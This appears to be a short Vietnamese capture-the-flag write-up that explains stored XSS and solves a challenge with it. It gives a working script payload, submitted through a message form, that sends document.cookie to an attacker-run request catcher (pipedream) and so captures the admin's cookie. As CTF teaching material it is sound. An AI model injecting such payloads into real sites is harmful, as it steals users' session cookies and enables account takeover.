Chall này là về 1 lỗ hổng bên client cơ bản: `Cross site scripting(XSS)`. XSS có 3 loại phổ biến là `reflected`, `stored` và `DOM based`, bài này chính là dạng `stored`. Cơ chế hoạt động của nó như sau: lợi dụng input form của web, nộp mã độc javascript(trong chall này là gửi cookie của người dùng cho 1 trang web do hacker quản lí), sau đó mã độc sẽ được lưu vào database. Mỗi khi người dùng truy cập vào trang web, mã độc sẽ được kích hoạt và thực hiện hành vi nguy hiểm.

Vậy để làm được điều này, ta cần 1 dịch vụ web để bắt request : [pipedream](https://pipedream.com)

Nhập code js sau vào phần message của chall:

```javascript
<script>
var i = new Image();
i.src = 'Your_request_catcher_link?cookie=' + document.cookie;
</script>
```

Rồi quan sát bên phía pipedream server. Đợi 1 lúc sẽ thấy 1 request mới gửi đến, trong đó chứa cookie của admin:

![image-20201019161958498](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20201019161958498.png)